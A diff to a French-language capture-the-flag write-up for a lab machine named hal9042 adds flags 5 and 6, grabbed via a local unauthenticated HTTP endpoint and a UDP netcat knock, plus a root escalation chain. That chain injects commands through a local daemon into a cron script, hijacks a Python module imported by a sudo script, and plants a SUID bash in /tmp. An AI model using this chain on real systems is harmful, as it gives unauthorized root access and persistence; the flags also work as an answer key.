@@ -62,7 +62,7 @@ Le script d'encryption de `paco` : `encrypt.py` nous explique qu'il nous faudra 
 |   3    | FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}             |
 |   4    | FLAG{h4l_r3v13ws_3v3ry_4pp34l}                   |
 |   5    | FLAG{b4sh_h1st0ry_1s_4_d14ry}                    |
-|   6    |                                                  |
+|   6    | FLAG{udp_1s_4_wh1sp3r}                           |
 |   7    |                                                  |
 |   8    |                                                  |
 |   9    |                                                  |
@@ -155,7 +155,27 @@ Autrement, il est mentionne dans le sujet que de fausses pistes sont volontairem
 #### #5 **FLAG{b4sh_h1st0ry_1s_4_d14ry}**
 
 - Contexte de decouverte: 
-    - 
+    - Le script `/opt/hal9042/services/telemetry.py` nous indique qu'un serveur HTTP ecoute sur `127.0.0.1` et peut nous exposer la valeur de la variable d'environnement `FLAG` sur `/internal/telemetry`. *P.S: Chargee depuis `/etc/hal9042/telemetry.env`, aux cotes de beaucoup d'entres `.env` en `rw` pour `root` seulement*.
+    - Meme si avec la session de `sophie` on ne peut pas lire directement le fichier contenant le secret, le service de telemetry est lui accessible localement sur le port `9000`.
+- Exploitation :
+    - Cette simple commande nous suffit a recuperer le flag : `curl http://127.0.0.1:9000/internal/telemetry`
+    - Le serveur nous retourne : FLAG{b4sh_h1st0ry_1s_4_d14ry}
+
+Le secret est tout simplement accessible depuis un endpoint HTTP local sans auth ou controle d'acces.
+
+#### #6 **FLAG{udp_1s_4_wh1sp3r}**
+
+- Contexte de decouverte :
+    - Le script `/opt/hal9042/services/whisper.py` met en place un serveur de telemetry UDP sur le port `1337` et le service ecoute sur `0.0.0.0` cad toutes les interfaces reseau.
+    - La lecture de ce script nous permet de comprendre ce qu'il attend : `handshake attendu: MAGIC <hostname>`
+    - `echo "test" | nc -u 127.0.0.1 1337` => `expected handshake: KNOCK <hostname>`
+- Exploitation : 
+    - Maintenant que l'on sait ce que le serveur attend comme format de handshake exactement on va construire.
+    - `hostname` = `hal9042`
+    - donc : `echo "KNOCK hal9042" | nc -u 127.0.0.1 1337`
+- Recuperation : 
+    - `FLAG{udp_1s_4_wh1sp3r}`
+
 
 ## KILL CHAIN
 
@@ -395,3 +415,124 @@ echo "$(date -u +%FT%TZ) [KEYPART] $(cd /home/ol/.config && cat .key_part)" >> "
 2026-09-23T14:15:02Z [KEYPART] M0ul1n3tt3
 ```
 
+### F. Escalade vers `root`
+
+1. Depuis la session ssh de `sophie`, comme constate precedemment une obtention de flag, le script `/home/ol/scripts/check.sh` est modifiable depuis le pivot `wil->ol` et ce script est execute periodiquement (tache cron, toutes ls 5mn). Ce sera notre point d'entree pour toute l'escalade.
+
+2. Le script `/opt/hal9042/script/report.py` est particulierement interessant. Il est executable avec `sudo` par `ol` et s'execute donc avec les privileges de `root` :
+```bash
+sophie@hal9042:~$ cat /opt/hal9042/scripts/report.py
+
+#!/usr/bin/env python3
+
+import sys
+
+sys.path.insert(0, "/opt/hal9042/lib")
+
+import moulai_utils
+
+def main():
+    print("[report] HAL9042 nightly report")
+    print("[report] evaluations today:", moulai_utils.count_today())
+    print("[report] done.")
+
+if __name__ == "__main__":
+    main()
+```
+
+Il est important de noter que le repertoire `/opt/hal9042/lib` est place en priorite comme chemin de recherche Python, ensuite, `report.py` importe `moulai_utils.py`.
+
+`moulai_utils.py` appartient au groupe `hal9042`, nickel, `ol` fait partie de ce groupe et nous permet de modifier ce script par le biais de `check.sh`
+
+3. Ecriture dans `moulai_utils.py`, `check.sh` et execution de `report.py` :  
+> [!TIP]
+> La difficulte principale ici reside dans le niveau de quoting : les commandes sont construites via `infect_step*.sh`, transmise au daemon `hal9042d`, puis ecrite dans `check.sh` avant d'etre interpretees par le shell lors de l'execution du cron. *P.S: je passe par un fichier /tmp/test, c'etait pour pouvoir consulter facilement le resultat et pas detruire `check.sh` a chaque erreur de script* 
+
+4. **Reconstruction de `check.sh`**
+Pour se simplifier la vie, ne plus polluer les logs, on clean `check.sh` : 
+```bash
+# ./infect_step0.sh
+#!/bin/bash
+
+echo 'DEBUG: echo "#!/bin/bash" > /tmp/test' | nc 127.0.0.1 7042
+```
+
+5. **Definition du fichier de `log`**
+```bash
+#!/bin/bash
+
+echo 'DEBUG: echo "LOG=/var/log/hal9042/check.log" >> /tmp/test' | nc 127.0.0.1 7042
+```
+
+6. **Injection du code Python dans `moulai_utils`**
+```bash
+#!/bin/bash
+
+echo 'DEBUG: echo "echo \"open('\''/tmp/root_escal.txt'\'','\''w'\'').write('\''created as root'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042
+```
+Resultat : `open('/tmp/root_escal.txt','w').write('created as root')`
+
+7. **Execution de `report.py` avec privileges `sudo`**
+```bash
+#!/bin/bash
+
+echo 'DEBUG: echo "sudo /opt/hal9042/scripts/report.py >> \"\$LOG\"" >> /tmp/test' | nc 127.0.0.1 7042
+```
+
+8. **`/tmp/test` ==> `check.sh`**
+```bash
+#!/bin/bash
+
+echo 'DEBUG: echo "$(cat /tmp/test)" > /home/ol/scripts/check.sh' | nc 127.0.0.1 7042
+```
+
+9. Lors de l'execution de `check.sh` via la crontable avec les privileges de `ol`, il modifie `moulai_utils.py`, puis lance `report.py` avec `sudo`
+
+`report.py` importe alors `moulai_utils.py`. En Python, les instructions globales d'un module sont executees des l'import (pas besoin de recreer `count_time()` donc). L'instruction injectee cree donc le fichier `/tmp/root_escal.txt` avec les privileges du processus qui lance `report.py` cad `sudo`.
+
+10. Apres le passage du cron : 
+```bash
+sophie@hal9042:~$ cd /tmp && ls -la
+-rw-r--r--  1 root   root        15 Sep 25 13:15 root_escal.txt
+
+sophie@hal9042:/tmp$ cat /tmp/root_escal.txt 
+created as root
+```
+La creation du fichier prouve que le code injecte dans `moulai_utils.py` a ete execute dans le contexte privilegie de `root`
+
+11. **Bonus : obtention d'un shell `root` persistant**
+Ayant demontre la vulnerabilite grace au POC de creation de fichier, le plus interessant serait de pouvoir disposer d'un shell interactif persistant. J'ai donc modifie le script d'injection dans `moulai_utils.py` comme suit : 
+```bash
+#!/bin/bash
+
+echo 'DEBUG: echo "echo \"import os; os.system('\''cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042
+```
+Lors de l'execution de `report.py`, `moulai_utils.py` est importe avec les privileges du processus `root`. L'insturction `os.system()` est donc elle meme executee dans ce contexte.  
+
+On cree une copie de bash dans `/tmp` puis on positionne le bit `SUID` sur cette copie en lui attribuant les perms 755.  
+
+A la verification des perms :  
+```bash
+ls -la /tmp/rootbash
+-rwsr-xr-x 1 root root 1446024 Sep 25 14:25 /tmp/rootbash
+```
+On passe bien d'un `x` a un `s` sur les permissions proprietaires.
+
+> [!IMPORTANT]
+> Le bit SUID signifie que lorsqu'un user execute `/tmp/rootbash`, le programme s'execute avec l'UID effectif du proprietaire plutot que l'user qui lance le script.  
+> **Attention :** Avec bash: s'il detecte une difference entre son UID reel et l'UID effectif, Bash peut abandonner certains privileges (securite).
+> **Bien lancer : `/tmp/rootbash -p`**. De cette maniere bash n'abandonne pas ses privileges effectifs. 
+
+- Sans `-p`: 
+```bash
+sophie@hal9042:~$ /tmp/rootbash
+rootbash-5.2$ whoami
+sophie
+```
+
+- Avec `p`:
+```bash
+sophie@hal9042:~$ /tmp/rootbash -p
+rootbash-5.2# whoami
+root
+```
